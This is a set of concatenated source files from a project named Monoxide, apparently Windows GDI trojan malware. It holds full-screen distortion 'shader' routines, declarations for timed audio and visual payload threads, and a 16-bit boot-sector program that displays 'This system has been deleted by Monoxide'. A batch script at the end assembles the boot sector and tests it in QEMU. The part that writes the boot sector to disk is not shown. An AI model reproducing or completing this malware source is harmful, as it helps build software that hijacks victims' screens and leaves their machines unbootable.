		StretchBlt( hdcTemp, x - ( nNewBlockSize - nBlockSize ) / 2, y - ( nNewBlockSize - nBlockSize ) / 2,
			nNewBlockSize, nNewBlockSize, hdcTemp, x, y, nBlockSize, nBlockSize, SRCCOPY );
	}
}

VOID
WINAPI
GdiShader8(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT div = ( FLOAT )t / 10.f;
	FLOAT a = FastSine( div ) * 32.f;
	FLOAT b = FastCosine( div ) * 32.f;
	FLOAT f = 1.f / 4.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;
	
	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a + ( INT )( TriangleWave( y, 10, h ) * 16.f );
			v = y + ( INT )b;

			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];

			if ( !rgbSrc.rgb )
			{
				rgbSrc.rgb = 1;
			}

			rgbDst.rgb &= rgbDst.rgb % ( ( rgbSrc.rgb << 8 ) + 1 );
			FLOAT _r = ( FLOAT )rgbDst.r * f + ( FLOAT )rgbSrc.r * ( 1.f - f );
			FLOAT _g = ( FLOAT )rgbDst.g * f + ( FLOAT )rgbSrc.g * ( 1.f - f );
			FLOAT _b = ( FLOAT )rgbDst.b * f + ( FLOAT )rgbSrc.b * ( 1.f - f );
			rgbDst.rgb = ( ( BYTE )_b | ( ( BYTE )_g << 8 ) | ( ( BYTE )_r << 16 ) );

			hsl = RGBToHSL( rgbDst );
			hsl.h = ( FLOAT )fmod( ( DOUBLE )hsl.h + ( DOUBLE )( x + y ) / 100000.0 + 0.05, 1.0 );
			hsl.s = 1.f;

			if ( hsl.l < .2f )
			{
				hsl.l += .2f;
			}

			rgbDst = HSLToRGB( hsl );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader6(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if ( !( t % 32 ) )
	{
		RedrawWindow( NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );
	}
	else
	{
		BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY );
	}
}

VOID
WINAPI
GdiShader9(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT div = ( FLOAT )t / 10.f;
	FLOAT a = FastSine( div ) * 32.f;
	FLOAT b = FastCosine( div ) * 32.f;
	FLOAT f = 1.f / 32.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a + ( INT )( SawtoothWave( y, 10, h ) * 16.f );
			v = y + ( INT )b;

			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];

			if ( !rgbSrc.rgb )
			{
				rgbSrc.rgb = 1;
			}

			rgbDst.rgb &= rgbDst.rgb % ( ( rgbSrc.rgb << 8 ) + 1 );
			FLOAT _r = ( FLOAT )rgbDst.r * f + ( FLOAT )rgbSrc.r * ( 1.f - f );
			FLOAT _g = ( FLOAT )rgbDst.g * f + ( FLOAT )rgbSrc.g * ( 1.f - f );
			FLOAT _b = ( FLOAT )rgbDst.b * f + ( FLOAT )rgbSrc.b * ( 1.f - f );
			rgbDst.rgb = ( ( BYTE )_b | ( ( BYTE )_g << 8 ) | ( ( BYTE )_r << 16 ) );

			hsl = RGBToHSL( rgbDst );
			hsl.h /= 1.0125f;
			hsl.s /= 1.0125f;
			hsl.l /= 1.0125f;
			rgbDst = HSLToRGB( hsl );

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader10(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT f = 1.f / 64.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( ( t + y ) % 64 ) * -1;
			v = y + ( t + x ) % 64;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];

			FLOAT _r = ( FLOAT )rgbDst.r * f + ( FLOAT )rgbSrc.r * ( 1.f - f );
			FLOAT _g = ( FLOAT )rgbDst.g * f + ( FLOAT )rgbSrc.g * ( 1.f - f );
			FLOAT _b = ( FLOAT )rgbDst.b * f + ( FLOAT )rgbSrc.b * ( 1.f - f );
			rgbDst.rgb = ( ( BYTE )_b | ( ( BYTE )_g << 8 ) | ( ( BYTE )_r << 16 ) );

			hsl = RGBToHSL( rgbDst );
			hsl.s = .5f;
			hsl.l *= 1.125f;

			if ( hsl.l > .5f )
			{
				hsl.l -= .5f;
			}

			if ( hsl.l < .25f )
			{
				hsl.l += .25f;
			}

			rgbDst = HSLToRGB( hsl );

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader11(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT f = 1.f / 4.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = x + y / ( h / 16 );
			v = y + u / ( w / 16 );
			u = x + v / ( h / 16 );

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];

			FLOAT _r = ( FLOAT )rgbDst.r * f + ( FLOAT )rgbSrc.r * ( 1.f - f );
			FLOAT _g = ( FLOAT )rgbDst.g * f + ( FLOAT )rgbSrc.g * ( 1.f - f );
			FLOAT _b = ( FLOAT )rgbDst.b * f + ( FLOAT )rgbSrc.b * ( 1.f - f );
			rgbDst.rgb = ( ( BYTE )_b | ( ( BYTE )_g << 8 ) | ( ( BYTE )_r << 16 ) );

			hsl = RGBToHSL( rgbDst );

			if ( hsl.s < .5f )
			{
				hsl.s = .5f;
			}

			if ( ( roundf( hsl.h * 10.f ) / 10.f ) != ( roundf( ( FLOAT )( ( Xorshift32( ) + t ) % 257 ) / 256.f * 10.f ) / 10.f ) )
			{
				hsl.h = ( FLOAT )fmod( ( DOUBLE )hsl.h + .1, 1.0 );
			}
			else
			{
				hsl.h = ( FLOAT )fmod( ( DOUBLE )hsl.h + .5, 1.0 );
			}

			rgbDst = HSLToRGB( hsl );

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader12(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = SquareWave( t + y, 10, h ) * 10.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = ( ( rgbDst.b - 1 ) | ( ( rgbDst.g + 1 ) << 8 ) | ( ( rgbDst.r - 2 ) << 16 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader13(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = TriangleWave( t * 4 + y, 10, h ) * 10.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = ( ( rgbDst.b + 1 ) | ( ( rgbDst.g + 1 ) << 8 ) | ( ( rgbDst.r + 1 ) << 16 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader14(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = TriangleWave( t * 4 + y, 10, h ) * SquareWave( t * 2 + y, 5, h ) * 10.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = ( ( rgbDst.b + ( x & y ) ) | ( ( rgbDst.g + ( x & y ) ) << 8 ) | ( ( rgbDst.r + ( x & y ) ) << 16 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader15(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			FLOAT a = coshf( atan2f( ( FLOAT )( ( y * 32 ) & t ), ( FLOAT )( ( x * 32 ) & t ) ) ) * log10f( ( FLOAT )( t | 64 ) ) * 32.f;
			FLOAT b = expf( ( FLOAT )acos( ( DOUBLE )t / 10.0 ) + x );

			u = x + ( INT )a;
			v = y + ( INT )b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = ( ( rgbDst.b ^ rgbDst.g ) | ( ( rgbDst.g ^ rgbDst.r ) << 8 ) | ( ( rgbDst.r ^ rgbDst.b ) << 16 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader16(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			FLOAT a = sinhf( atanf( ( FLOAT )( ( ( t + x ) * 32 ) & t ) ) ) * logf( ( FLOAT )( t | 256 ) ) * 32.f;
			FLOAT b = expf( ( FLOAT )asin( ( DOUBLE )t / tanh( 10.0 ) ) + ( FLOAT )( x + y ) );

			u = x + ( INT )a;
			v = y - ( INT )b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = ( ( rgbDst.b | rgbDst.g ) | ( ( rgbDst.g | rgbDst.r ) << 8 ) | ( ( rgbDst.r | rgbDst.b ) << 16 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader17(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			FLOAT a = ( FLOAT )ldexp( ( DOUBLE )atanf( ( FLOAT )( ( ( t + x ) * 16 ) & t ) ), t + y ) * ( FLOAT )scalbn( ( DOUBLE )( t | 256 ), x & y * 24 ) * 32.f;
			FLOAT b = ( FLOAT )expm1( ( DOUBLE )sqrtf( t * ( FLOAT )hypot( 10.0, ( DOUBLE )( t % 20 ) ) ) + ( DOUBLE )( x | y ) );

			u = x + ( INT )b;
			v = y + ( INT )a;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			HSLCOLOR hsl = RGBToHSL( rgbDst );
			hsl.h = ( FLOAT )fmod( ( DOUBLE )rgbDst.r / 255.0 + ( DOUBLE )t / 128.0, 1.0 );
			hsl.s = ( FLOAT )rgbDst.g / 255.f;
			hsl.l = ( FLOAT )rgbDst.b / 255.f;
			rgbDst = HSLToRGB( hsl );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader18(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	FLOAT c = 1.f / 8.f;
	BYTE d;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = TriangleWave( t * 8 + y / 2, 2, w ) * SquareWave( t * 8 + y / 2, 2, h ) * 4.f;

		for ( INT x = 0; x < w; x++ )
		{
			FLOAT b = TriangleWave( t * 8 + x / 2, 2, w ) * SquareWave( t * 8 + y / 2, 2, h ) * 4.f;

			u = x + ( INT )a;
			v = y + ( INT )b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.r = ( BYTE )( ( FLOAT )rgbDst.r * c + ( a * b ) * ( 1.f - c ) );
			rgbDst.g += rgbDst.r / 16;
			
			d = rgbDst.b;

			if ( !d )
			{
				d = 1;
			}

			rgbDst.b += rgbDst.r / d;

			HSLCOLOR hsl = RGBToHSL( rgbDst );
			hsl.h = ( FLOAT )fmod( ( DOUBLE )hsl.h + .01, 1.0 );
			hsl.s = ( FLOAT )fmod( ( DOUBLE )( hsl.s + hsl.h ) + .01, 1.0 );
			hsl.l = ( FLOAT )fmod( ( DOUBLE )( hsl.l + hsl.h ) + .01, 1.0 );
			rgbDst = HSLToRGB( hsl );

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader19(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = FastSine( ( FLOAT )t / 8.f + ( FLOAT )y / 64.f ) * 4.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = x + t + ( INT )a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb += ( COLORREF )( __rdtsc( ) & 0b100000001000000010000000 & ( __rdtsc( ) & 0b100000001000000010000000 ) );
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader20(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	HSLCOLOR hsl;
	hsl.h = ( FLOAT )fmod( ( DOUBLE )t / 512.0, 1.0 );
	hsl.s = 1.f;
	hsl.l = .5f;
	COLORREF crRainbow = HSLToRGB( hsl ).rgb;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT a = FastSine( ( FLOAT )t / 16.f + ( FLOAT )y / 64.f ) * 8.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a;
			v = y ^ ( y % ( abs( ( INT )( a * a ) ) + 1 ) );

			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb &= crRainbow;

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader21(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		HSLCOLOR hsl;
		hsl.h = ( FLOAT )fmod( ( DOUBLE )t / 16.0 + ( DOUBLE )y / ( DOUBLE )h * 2.f, 1.0 );
		hsl.s = 1.f;
		hsl.l = .5f;
		COLORREF crRainbow = HSLToRGB( hsl ).rgb;

		FLOAT a = FastSine( ( FLOAT )t / 16.f + ( FLOAT )y / 64.f ) * 8.f;

		for ( INT x = 0; x < w; x++ )
		{
			u = ( INT )( x * fabs( fmod( ( DOUBLE )a - ( DOUBLE )( INT )( a * a ), 1.0 ) ) ) + x;
			v = y + ( INT )( a * a );

			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.rgb = rgbDst.rgb & 0xAAAAAA | crRainbow;
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
FinalGdiShader(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( t );
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );
	UNREFERENCED_PARAMETER( prgbSrc );

	RGBQUAD rgbDst;

	for ( INT i = 0; i < w * h; i += w )
	{
		rgbDst.rgb = ( Xorshift32( ) % 256 ) * 0x010101;

		for ( INT j = 0; j < w; j++ )
		{
			prgbDst[ i + j ] = rgbDst;
		}
	}
}
#pragma once
#include "monoxide.h"

#define TIMER_DELAY 100
#define PAYLOAD_MS 10000
#define PAYLOAD_TIME ( PAYLOAD_MS / TIMER_DELAY )

#define SineWave(t, freq, sampleCount) FastSine(2.f * 3.1415f * ((FLOAT)(freq) * (FLOAT)(t) / (FLOAT)(sampleCount)))
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
#define SawtoothWave(t, freq, sampleCount) (fmod(((FLOAT)(t) / (FLOAT)(sampleCount)), (1.f / (FLOAT)(freq))) * (FLOAT)(freq) * 2.f - 1.f)

VOID
WINAPI
BeepEx(
	_In_ INT nWaveformIndex,
	_In_ INT nDuration,
	_In_ PSHORT psFreq,
	_In_ PFLOAT pfVolume
);

VOID
WINAPI
AudioPayloadThread( VOID );

VOID
WINAPI
AudioSequenceThread(
	_In_ PAUDIO_SEQUENCE_PARAMS pAudioParams
);

VOID
WINAPI
ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPreSynthOp,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPostSynthOp
);

#define SYNTH_LENGTH 16
AUDIO_SEQUENCE AudioSequence1;
AUDIO_SEQUENCE AudioSequence2;
AUDIO_SEQUENCE AudioSequence3;
AUDIO_SEQUENCE AudioSequence4;
AUDIO_SEQUENCE AudioSequence5;
AUDIO_SEQUENCE AudioSequence6;
AUDIO_SEQUENCE AudioSequence7;
AUDIO_SEQUENCE AudioSequence8;
AUDIO_SEQUENCE AudioSequence9;
AUDIO_SEQUENCE AudioSequence10;
AUDIO_SEQUENCE AudioSequence11;
AUDIO_SEQUENCE AudioSequence12;
AUDIO_SEQUENCE AudioSequence13;
AUDIO_SEQUENCE AudioSequence14;
AUDIO_SEQUENCE AudioSequence15;
AUDIO_SEQUENCE AudioSequence16;
AUDIO_SEQUENCE FinalAudioSequence;
AUDIO_SEQUENCE_PARAMS pAudioSequences[ 25 ];

VOID
WINAPI
GdiShaderThread(
	_In_ PGDISHADER_PARAMS pGdiShaderParams
);

VOID
WINAPI
ExecuteGdiShader(
	_In_ HDC hdcDst,
	_In_ RECT rcBounds,
	_In_ INT nTime,
	_In_ INT nDelay,
	_In_ GDI_SHADER pGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPreGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPostGdiShader
);

INT nShaderThreeSeed;
GDI_SHADER GdiShader1;
GDI_SHADER GdiShader2;
GDI_SHADER GdiShader3;
GDI_SHADER GdiShader4;
GDI_SHADER GdiShader5;
GDI_SHADER GdiShader6;
GDI_SHADER GdiShader7;
GDI_SHADER GdiShader8;
GDI_SHADER GdiShader9;
GDI_SHADER GdiShader10;
GDI_SHADER GdiShader11;
GDI_SHADER GdiShader12;
GDI_SHADER GdiShader13;
GDI_SHADER GdiShader14;
GDI_SHADER GdiShader15;
GDI_SHADER GdiShader16;
GDI_SHADER GdiShader17;
GDI_SHADER GdiShader18;
GDI_SHADER GdiShader19;
GDI_SHADER GdiShader20;
GDI_SHADER GdiShader21;
GDI_SHADER FinalGdiShader;
GDI_SHADER_OPERATION PreGdiShader1;
GDI_SHADER_OPERATION PostGdiShader1;
GDI_SHADER_OPERATION PostGdiShader2;
GDI_SHADER_OPERATION PostGdiShader3;
GDI_SHADER_OPERATION PostGdiShader4;
GDI_SHADER_OPERATION PostGdiShader5;
GDI_SHADER_OPERATION PostGdiShader6;
GDI_SHADER_PARAMS pGdiShaders[ 25 ];
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Monoxide.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
#include "monoxide.h"

VOID
WINAPI
TimerThread(
	VOID
)
{
	SetTimer( NULL, 0, TIMER_DELAY, ( TIMERPROC )TimerProc );

	MSG msg;
	while ( GetMessageW( &msg, NULL, 0, 0 ) )
	{
		TranslateMessage( &msg );
		DispatchMessageW( &msg );
	}
}
#pragma once
#include "monoxide.h"

VOID
WINAPI
TimerThread(
	VOID
);
bits 16 ; 16-bit code
org 0x7C00 ; Set image base

xor ax, ax
mov ds, ax
mov es, ax
mov fs, ax
mov gs, ax
mov ss, ax ; Clear segment registers

mov esp, 0x7C00
mov ebp, esp ; Stack starts at bootloader base

jmp 0x0000:load ; Clear CS, some BIOSes set CS=0x7C0 and IP=0

load:
	xor ah, ah   ; Set video mode function (0x00)
	mov al, 0x13 ; 320x200, 256 colors
	int 0x10

	rdtsc
	mov word [seed], ax ; Set seed to timestamp counter

	call text_loop

	mov ax, 0xA000    ; Video memory address
	mov es, ax        ; Set segment
	mov di, 320*200-1 ; Set index
	mov cl, 32        ; Set color index 32 in VGA palette

	jmp draw_loop       ; Enter draw loop

; AX = Return value, BX = Seed
xorshift16:
	mov ax, bx ; Load seed into AX
	shl ax, 7 ; Shift
	xor bx, ax ; XOR...
	mov ax, bx
	shr ax, 9
	xor bx, ax
	mov ax, bx
	shl ax, 8
	xor bx, ax
	mov ax, bx
	ret

text_loop:
	mov ah, 0x02 ; Set cursor position
	xor bh, bh   ; Page number
	xor dl, dl   ; Column
	int 0x10
	
	mov si, string
.char_loop:
	lodsb             ; Load character from SI
	or al, al         ; Testing for character
	jz .char_loop_end ; Check if character is zero termination

	push ax
	mov bx, word [seed]
	call xorshift16
	xor word [seed], ax
	mov bl, al
	pop ax

	mov ah, 0x0E ; Print character
	int 0x10
	jmp .char_loop
.char_loop_end:
	inc dh
	jz .end
	jmp text_loop
.end:
	ret

draw_loop:
	mov bx, word [seed]
	call xorshift16
	xor word [seed], ax

	xor dx, dx
	mov bx, 3
	div bx
	mov ax, dx
	add al, cl ; Add counter to make a rainbow effect

	mov [es:di], al ; Set pixel
	dec di          ; Decrement index
	cmp di, 0xFFFF  ; Check if index went out of bounds
	jne draw_loop   ; Continue if ended

	mov di, 320*200-1 ; Reset index
	cmp cl, 51        ; Check if above color index 51 in VGA palette
	jg .rainbow_end
	inc cl            ; Increment color index
	jmp draw_loop
.rainbow_end:
	inc ch        ; Increment counter
	mov cl, 32    ; Set color index 32 in VGA palette
	jmp draw_loop

seed:
	dw 4096
string:
	db 'This system has been deleted by Monoxide', 0x00

times 510 - ($ - $$) db 0
dw 0xAA55 ; Signature
@echo off
nasm monoxide.asm -o monoxide.bin
qemu-system-x86_64 -drive file=monoxide.bin,format=raw -monitor stdio -m 256 -no-shutdown -no-reboot -accel hax -L "C:\Program Files\qemu"